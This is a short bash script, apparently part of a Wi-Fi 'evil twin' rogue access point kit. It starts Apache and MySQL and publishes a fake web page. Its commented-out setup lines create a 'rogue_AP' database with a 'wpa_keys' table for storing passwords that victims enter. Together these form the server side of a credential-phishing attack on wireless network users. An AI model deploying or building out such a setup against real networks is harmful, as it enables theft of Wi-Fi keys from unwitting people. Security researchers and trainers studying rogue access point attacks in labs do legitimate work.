#!/bin/bash

echo "Creating evil twin services"

/etc/init.d/apache2 start
/etc/init.d/mysql start
sudo cp -r Fake_Web_Page/. /var/www/html/
# Uncomment only if the DB was not inited

#echo "create user fakeap identified by 'fakeap';" | sudo mysql -u root
#echo "create database rogue_AP;" | sudo mysql -u root
#echo "use rogue_AP;create table wpa_keys(password1 varchar(32), password2 varchar(32));" | sudo mysql -u root
#echo "grant all privileges on rogue_AP.* to 'fakeap';" | sudo mysql -u root

echo "Finished creating evil twin services"